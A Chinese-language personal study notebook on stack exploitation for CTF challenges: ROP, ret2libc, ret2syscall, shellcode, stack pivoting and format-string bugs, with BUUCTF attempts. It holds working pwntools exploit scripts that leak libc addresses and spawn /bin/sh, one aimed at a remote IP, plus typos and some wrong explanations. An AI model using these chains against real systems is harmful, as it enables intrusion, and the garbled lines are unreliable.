# **PWN学习笔记**

栈的增长方向是高地址向低地址，栈底在高地址一侧。

 

每个函数有自己对应的栈帧

call 能把栈上添加一个返回地址同时把rsp后移

push rbp +mov rbp,rsp：保存当前函数调用前的基址指针，以便在函数返回时恢复现场+可以方便地通过 rbp 来访问栈上的局部变量和参数

 

# **根据64位ROP解level2x64**

 

首先，因为是64位的，使用寄存器进行传参，传参首先 rdi（first）和system函数找找在哪

打开csu_init,找到pop r15   4006B2 由地址错位

从4006B3出发可得到pop rdi

system地址可直接知道

看main函数有个vulnerable_function()点开，找到溢出处return read(0, buf, 0x200uLL);，点开buf可知栈内：

-0000000000000080 buf             db 128 dup(?)

+0000000000000000  s              db 8 dup(?)

+0000000000000008  r              db 8 dup(?)

+0000000000000010

+0000000000000010 ; end of stack variables

则read函数返回地址在+00000000000000010

先把栈填好b'a'*88

然后在前面先加pop rdi（rsp->010） 然后让其把后面加的bin/sh的地址存入rdi此时会继续进行下一条，只需把下一条改成system(rsp->018)的地址让其ret到system，随后rdi里的bin/sh的地址就会做为第一个参数传入system然后getshell

 

# **根据32位ROP解get_start_3dsctf_x32**

(要命，按照上面说的没关注getflag的返回地址导致无法获得，后来搜了一下才知道还有个exit函数在那，所以最后时返回地址加离开地址加两个参数a1a2)ps:a1a2转16进制

# **对re2libc的理解（此为helloctf中的例子）**

exp脚本解析：

#### **1.开头得加上elf = ELF("./a.out")**

libc = ELF("./libc-2.31.so")方便后续获取程序的各种地址信息

####             2.     **第一次攻击核心：**

payload += p64(pop_rdi)

payload += p64(puts_got)

payload += p64(puts_plt)

payload += p64(main_addr)

为通过main函数里的puts获取到puts函数的实际地址

####             1.     **对得到的puts地址进行处理**

uts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))

log.success("puts_addr: " + hex(puts_addr))

 

p.recvuntil(b"\x7f")：接收目标程序输出的数据，直到遇到 \x7f 字节。

[-6:]：截取最后 6 个字节的数据。

.ljust(8, b"\x00")：将截取的数据左对齐，不足 8 字节的部分用 \x00 填充，以形成 64 位的地址。

u64(...)：将字节数据转换为 64 位无符号整数，得到 puts 函数的基地址。

log.success(...)：使用 pwn 库的日志函数输出 puts 函数的地址。

####             2.     **通过puts函数的基地址和偏移后的地址做差得到libc库的基地址：**

libc_base = puts_addr - libc.sym["puts"]

log.success("libc_base: " + hex(libc_base))

####             3.     **计算system和binsh实际运行时地址**

system_addr = libc_base + libc.sym["system"]

binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

6.按照正常栈溢出的方法

payload = b"a" * 0x28

payload += p64(pop_rdi)

payload += p64(binsh_addr)

payload += p64(ret)【还是加上这个的好，其实通常还是要求栈对齐的】

payload += p64(system_addr)

## **所有步骤的疑惑点理解如下：**

###### **1.puts地址来源**

开始前，先理解一个概念，IDA侧边栏中的地址是静态链接时的虚拟地址

​                ● **PLT 地址**：静态固定，在二进制文件中不变（即使开启 ASLR）。

​                ● **GOT 地址**：存储运行时解析的真实地址（如 libc_base + puts_offset），每次运行不同（因 ASLR）。

​                ● **IDA 视角**：静态分析时，GOT 表中存储的是 PLT 跳转指令的下一条指令地址（用于动态解析），而非真实函数地址。因此 IDA 不会直接显示 GOT 中的运行时地址。

所以，我们需要通过payload1得到puts的实际地址

######             2.     **为什么libc的基地址libc_base = puts_addr - libc.sym["puts"]**

去搜了一下，是因为对指令不熟libc.sys["puts"]得到的是puts的偏移量...

######             3.     **对得到的puts的处理得到基地址的过程解析**

疑问1解析：在 Linux 系统中，\x7f 是 ELF 文件头的第一个字节，而 libc 库是 ELF 格式的，puts 函数的地址属于 libc 库，所以可以通过这种方式来确定 puts 函数地址输出的边界。

疑问2解：由于 Linux 系统的地址空间布局随机化（ASLR）后八位就是puts函数地址的有效部分虽然不知道为什么这里是【-6】不过他最后又用.ljust(8, b"\x00")补齐了八位

ljust(8, b"\x00") 是字符串的方法，用于将字符串左对齐，不足 8 字节的部分用 \x00 填充。因为我们需要将这 6 个字节的数据恢复成 64 位（8 字节）的地址，所以用 \x00 填充高 2 字节。

######             4.     **log用处：**

log.success("puts_addr: " + hex(puts_addr))

log.success 是 pwn 库中的日志函数，用于输出成功信息。这里将 puts 函数的地址以十六进制的形式输出，方便我们查看和后续的计算。

# **对re2shelllcode的理解**

看了一下，虽说原理不难理解但还是要去了解一下里面没提到的东西比如：shellcode内容用什么打上去（直接py?）

 

p.send(asm(shellcraft.sh()).ljust(0x1000, b"\x00"))

好吧，是我错误理解了，shellcraft.sh()就是我所构建的内容了能直接运行得到shell

# **对re2syscall的理解（hello上没,找的wiki）**

 

ret2syscall，即控制程序执行系统调用，获取 shell。

大致内容可见wiki，这里详细解释一下核心部分的运行过程

exp:



```
from pwn import *
sh = process("./rop")
eax_pop = 0x080bb196
edx_ecx_ebx_pop = 0x0806eb90
sh_pop = 0x080be408
Ret_syscall = 0x08049421
payload = b"a"*112
```





1.payload += p32(eax_pop)+p32(0x0b)[ 0xb 为 execve 对应的系统调用号。]

程序执行到 eax_pop 地址处的 pop eax 指令。

从栈中弹出 0x0b 到 eax 寄存器，此时 eax = 0x0b。

​            2.     payload += p32(edx_ecx_ebx_pop)+p32(0x0)+p32(0x0)+p32(sh_pop)

栈上依次压入 edx_ecx_ebx_pop 地址、0x0（用于 edx）、0x0（用于 ecx）和 sh_pop（用于 ebx）

​            3.     payload += p32(Ret_syscall)

栈上压入 Ret_syscall 地址（int 0x80 指令的地址）。

系统调用号已经放入 eax 寄存器后，执行 int 0x80 指令，就会触发系统调用。操作系统的内核会接管控制权，读取 eax 中的系统调用号，识别出是 execve 系统调用，然后从 ebx、ecx 和 edx 寄存器中读取相应的参数，最终尝试在子进程中启动 /bin/sh 程序。

综上所述，当 eax = 0x0b，ebx 指向 /bin/sh 字符串的地址，ecx = 0x0，edx = 0x0 且执行 int 0x80 指令时，系统就会执行 execve 系统调用，尝试启动 /bin/sh 程序，从而为我们提供一个 shell

# **栈迁移**

栈迁移的本质是通过控制 RBP 间接控制 RSP，将执行上下文从受限的栈空间迁移到可控区域（如堆、bss 段）

虽然第一瞬间没看懂，但.......（最近用AI帮助理解还挺不错的）

**leave 执行流程**（等价于 2 条指令）：

​            1.     mov rsp, rbp ：RSP 跳转到当前栈帧的 RBP（即黄色部分的值，攻击者可控！）

​            2.     pop rbp ：RBP 恢复为上一栈帧的 rbp（此时 RSP 指向返回地址）

**ret 执行**：

​                ● pop rip：从当前 RSP（即返回地址位置）取值，跳转执行

### **二、栈迁移的核心攻击逻辑**

​            1.     **第一步：覆盖上一栈帧的 RBP**

在栈溢出时，将**当前栈帧中保存的 RBP**（黄色部分）覆盖为**攻击者指定的地址 X**。

​            2.     **leave 触发栈迁移**

当函数执行leave时：

​            a.     RSP = X（攻击者控制的地址）

​            b.     RBP = 原栈帧中保存的 RBP（此时已不重要）

​            3.     **ret 执行 ROP 链**

此时 RSP 指向**返回地址位置**（X+8），攻击者可在 X+8 处布置 ROP 指令地址，或直接布置 shellcode。

 

# **ROP暂时告一段落，开始实战**

从BUUCTF开始吧

## **rip**

很快就把exp写出来了

但好像出了什么问题

最后不得不上网搜，发现有个隐藏知识点：堆栈平衡

当我们在堆栈中进行堆栈的操作的时候，一定要保证在RET这条指令之前，ESP指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址 一定要是call指令的下一个地址。

话是这么说，但我理解就是ESP此时指的是RBP压进来的值而不是ESP的返回地址

原因。或者说不就是为防止攻击，有自动识别堆栈和大部分寄存器（据说除了EIP）在执行函数前后有没有改变的防护措施。

## **warmup_csaw_2016**

倒是很简单，但也有小错误，打溢出填充物的时候忘记把乘的数带上0x了，下次要不直接用计算机换成10进制吧...

## **ciscn_2019_n_1**

先checksec发现开了NX，感觉就是ROP

mian里面有个func打开

int func()

{

  char v1[44]; // [rsp+0h] [rbp-30h] BYREF

  float v2; // [rsp+2Ch] [rbp-4h]

 

  v2 = 0.0;

  puts("Let's guess the number.");

  gets(v1);

  if ( v2 == 11.28125 )

​    return system("cat /flag");

  else

​    return puts("Its value should be 11.28125");

}

一眼溢出v1到v2使得v2=11.28125

emm...。我先去查查浮点数的16进制转换

将十进制数转换为二进制：

整数部分 11 转换为二进制是 1011。

小数部分 0.28125 转换为二进制：

0.28125 * 2 = 0.5625，整数部分为 0。

0.5625 * 2 = 1.125，整数部分为 1。

0.125 * 2 = 0.25，整数部分为 0。

0.25 * 2 = 0.5，整数部分为 0。

0.5 * 2 = 1.0，整数部分为 1。

所以小数部分转换为二进制是 01001。

那么 11.28125 的二进制表示为 1011.01001。

规范化二进制表示为 1.01101001×2³。

根据 IEEE 754 单精度浮点数格式表示：

单精度浮点数（32 位）由三部分组成：符号位（1 位）、指数位（8 位）和尾数位（23 位）。

符号位：因为 11.28125 是正数，所以符号位为 0。

指数位：规范化后的指数为 3，加上偏移量 127 得到 130，二进制表示为 10000010。

尾数位：去掉规范化后的整数部分 1，取小数部分 01101001，不足 23 位则在右边补零，得到 01101001000000000000000。

组合起来，单精度浮点数的二进制表示为 0 10000010 01101001000000000000000。

将二进制转换为十六进制：

按每 4 位一组划分二进制数：0100 0001 0011 0100 1000 0000 0000 0000，转换为十六进制为 41348000

嗯，八位，很合理

v1到v2有2c

最后写出了exp

不过..........最终还是出了小问题，没有把41348000用p64包起来...也是神人了

今天就到这了，明天学canary的相关知识（不能只会bybass）

# **Canary**

三种解canary的方法

​            1.     利用print等函数或栈溢出漏洞

​            2.      

原本打算先学canary的，但遇到了一道有canary但值只用canary解不出的题

先学学格式化字符串

# **格式化字符串**

知识点：

而在我们格式化字符串漏洞的利用中，我们通常还会用到正常开发很少用到的字符：数字+\$的形式。

还记得我们前面写的那个程序吗？在那个格式化字符串中，我们没有用到数字+\$，在这时候，程序遇到一个占位符，就按顺序向后寻找参数，但是我们可以使用数字+$的形式，直接指定参数相对于格式化字符串的偏移，我们来看看这个程序：

 

int main() {

 

​    char a[] = "aaaa";

​    char b[] = "bbbb";

​    char c[] = "cccc";

​    char d[] = "dddd";

​    printf("%3$s  %2$s  %1$s", a, b, c);

 

​    return 0;

}

这样，当程序看到%3$s的时候，就不是直接找相对于格式化字符串的第一个参数了，而是去找相对于格式化字符串的第三个参数，这样的话，就会输出cccc，而整个程序输出cccc bbbb aaaa。

 

我们就来回顾一下C语言格式化字符串中常用的占位符：

 

占位符	含义

%d	以十进制形式输出整数

%u	以十进制形式输出无符号整数

%x	以十六进制形式输出整数（小写字母）

%X	以十六进制形式输出整数（大写字母）

%o	以十进制形式输出整数

%f	以浮点数形式输出实数

%e	以指数形式输出实数

%g	自动选择%f或者%e输出实数

%c	输出单个字符

%s	输出字符串

%p	输出指针的地址

%n	将已经输出的字符数写入参数

以上这些就是常用的占位符了，而在我们格式化字符串漏洞利用中，常用%p来泄露地址，使用%n来实现向指定地址写入数据（4字节），我们还通常会使用%hn（2字节），%hhn（1字节），%lln（8字节）进行写入。

任意地址泄露：这时候，如果我们配合%数字$s，这时候是不是就会造成任意地址泄露？

任意地址写：如果我们输入%数字c%数字$n呢？这时候我们就可以实现任意地址写了。

今天还学了多种字符串格式化漏洞，和题目，明天汇总

算了，不汇总了

继续做

## **jarvisoj_level2**

DIE 32 C类

checksec NX  70S

ida 看了一眼，有可以溢出的地方，没有可以直接用的sys，找到了libc csu init,应该就是ROP，找,sysaddr 08048320,/bin/sh 0804A024 直接写EXP

烦人，到最后还是出错了，打不进去的时候我就有想，可能是因为没加返回地址，但我又没有找到类似与exit之类的函数，看完WP才发现可以在sys和binsh之间加一个p32（0）来覆盖掉调用sys的ret地址

## **ciscn_2019_n_8**

IDE 32

checksec canary nx pie（我勒个豆，全开了）

打开了奇怪的var数组，直接到bss段底了，

但发现只要var[13]=17就好

所以直接全打入17（毕竟我也不知道从哪里开始进入var）

## **bjdctf_2020_babystack**

真的很baby

## **ciscn_2019_c_1**

DIE 64 C

NX

该程序中并没有system，bin/sh等有用的字符串，无法使用ret2text

没有调用system函数，无法使用ret2syscall

只能用ret2libc

很好，忘了...

但根据上面的笔记，先是通过puts得到puts的地址（当然这个程序是先进入begin然后用gets）

### **核心思路：**

调用动态链接函数，先去plt表和got表寻找函数的真实地址。plt表指向got表中的地址，got表指向glibc中的地址。

 

即第一次调用:plt->got->plt->公共plt->动态连接器->锁定函数地址

 

第二次:plt->got->直接锁定函数地址，此时got表已记录函数地址

 

got表：包含函数的真实地址，包含libc函数的基址，用于泄露地址

 

plt表：不用知道libc函数真实地址，使用plt地址就可以调用函数

 

libc是linux下的c函数库，包含各种常用的函数，在程序执行时才被加载到内存中

libc是一定可以执行的，跳转到libc中函数绕过NX保护

 

通过已经调用过的函数泄露它在程序中的地址，然后利用地址末尾的3个字节，在https://libc.blukat.me找到该程序所用的libc版本

 

程序函数地址=加载程序的基址+libc中函数偏移量

 

想办法通过encrypt函数的 get函数栈溢出获得其中一个函数的地址（本题选择puts），通过LibcSearcher得到该函数在对应libc中的偏移量

 

即可得到加载程序的基址

于是基地址获取

from pwn import*

from LibcSearcher import *

r=remote('',) 

elf=ELF("")

 

main_addr=0x400B28

rdi=0x400c83

puts_plt=elf.plt['puts']

puts_got=elf.got['puts']

 

r.sendlineafter(b'Input your choice!\n', b'1')

 

offset = 0x50+8-1

payload = b'\0' + b"a" * offset+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)

r.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

r.recvuntil("Ciphertext\n")

r.recvuntil("\n")

 

puts_addr=u64(r.recv(6).ljust(0x8,b"\x00"))

libc=LibcSearcher("puts",puts_addr)he

libcbase=addr-libc.dump("puts")

print(libcbase)

接下来就可以直接从libc中调出sys和binsh

r.sendlineafter(b'Input your choice!\n', b'1')

r.recvuntil(b"Input your Plaintext to be encrypted\n")

sys_addr=libcbase+libc.dump('system')

bin_sh=libcbase+libc.dump('str_bin_sh')

ret=0x4006b9

p1=b'\0' + b"a" * offset + p64(ret)+p64(rdi)+p64(bin_sh)+p64(sys_addr)

r.sendline(p1)                     

r.interactive()

OK，解了

...............................................................

才怪，没安装libcseacher还

## **XYCTF（复盘：未解出，记录思路与卡点）**

### **re2libc:**

checksec NX

64

好吧，最后也是没有做出了呢、

我看了一下WP发现的问题如下：

EXP：from pwn import * 

io = remote("47.94.103.208", 26657) 

*#io = process("./attachment")* 

libc = ELF("./libc.so.6") 

context(os='linux', arch='amd64') 

*#context.log_level='debug'* 

payload = b'a' * 0x21c + b'\x28' + p64(0x4010E0)【_dl_relocate_static_pie】 + p64(0x4010EB) + 

p64(0x401180) + p64(0x401070) + p64(0x40127B) + p64(0x404018) 

*#gdb.attach(io)* 

io.sendline(payload) 

payload = b'a' * 0x21c + b'\x28' + p64(0x40127B) 

for i in range(214): 

io.sendline(payload) 

print("finish") 

libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x80e50 

print(hex(libc_base)) 

payload = b'a' * 0x21c + b'\x28' + p64(libc_base + 0x2a3e5) + p64(libc_base + 

0x1d8678) + p64(libc_base + 0x50d70) 

io.sendline(payload) 

io.interactive()

 

1.源码中stdout为全缓冲 

代码块 

setvbuf(stdout, 0LL, 0, 0LL)

这里的全缓冲具体内容如下（来自CSDN）：

缓冲区：

 

全缓冲：与文件相关，缓冲区刷新条件包括程序正常退出、缓冲区溢出、强制刷新fflush、fclose关闭对应的流。

大小4096

行缓冲：与终端相关，缓冲区刷新条件包括遇到\n、程序正常退出、缓冲区溢出、强制刷新fflush、fclose关闭对应的流

大小1024

不缓冲：没有缓冲区，标准错误。

代码setvbuf(stdout, 0LL, 0, 0LL);，其中第三个参数为 0，表示将stdout设置为全缓冲。若第三个参数为 1，则是行缓冲；为 2 时是无缓冲

# **工具的使用（备忘）**

## **ROPgadget**

直接输入：ROPgadget --binary （文件名）

## **GDB**

直接gdb (file)

break 函数名 or break 行号可以设置断点

run 或 r运行

print 变量名看变量的值

next（n）下一条，step(s)进入函数内

## **OllyDbg**

## **Radare2**

radare2 file

## **objdump**

 -d [可执行文件名] 命令可以对可执行文件进行反汇编，显示其汇编代码。例如， objdump -d test 会输出 test 文件的反汇编代码。

-f file  可以查看文件的头信息，如文件类型、目标机器等。

 -t [可执行文件名] 可以查看文件的符号表，包括函数名、变量名及其对应的地址等信息。

-s -j [段名] [可执行文件名] 可以显示指定段的内容，例如 objdump -s -j.text test 会显示 test 文件中 .text 段的内容。

# **基于本电脑的linux指令**

## **基本**

 

 

## **不同**

​            1.     仅有sudo -i可以升权